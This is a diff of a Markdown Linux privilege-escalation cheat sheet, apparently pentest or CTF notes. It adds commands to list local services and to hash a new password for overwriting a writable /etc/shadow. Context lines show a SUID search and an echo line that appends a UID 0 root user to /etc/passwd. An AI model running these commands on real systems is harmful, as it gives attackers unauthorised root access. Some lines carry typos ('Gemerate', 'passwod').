@@ -48,6 +48,12 @@ export TERM=xterm
 
 ### Exploits
 - Which services are running on `localhost`?
+    - Get locally running services:
+        ```bash
+        # tcp, listening, program, numeric output
+        ss -tlpn
+        netstat -tlpn
+        ```
 - Kernel versions and exploits?
     ```bash
     # Get kernel version
@@ -104,6 +110,13 @@ find / -perm -u=s -type f 2>/dev/null
 
 #### Sensitive files writable
 - `/etc/shadow`
+    - Replace a users password
+        ```bash
+        # Gemerate password
+        mkpasswd -m sha-512 NEW_PASSWORD
+
+        # Then replace it with the shadow file
+        ```
 - `/etc/passwd`
     - Create new user with known password, set `UID = 0` (root access)
         ```bash
@@ -111,6 +124,7 @@ find / -perm -u=s -type f 2>/dev/null
         openssl passwd -1 -salt [salt] [password]
         openssl passwod -1 -salt new 123
             $1$new$p7ptkEKU1HnaHpRtzNizS1 
+
         # Add new root user to /etc/passwd
         echo 'new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash' >> /etc/passwd
         ```
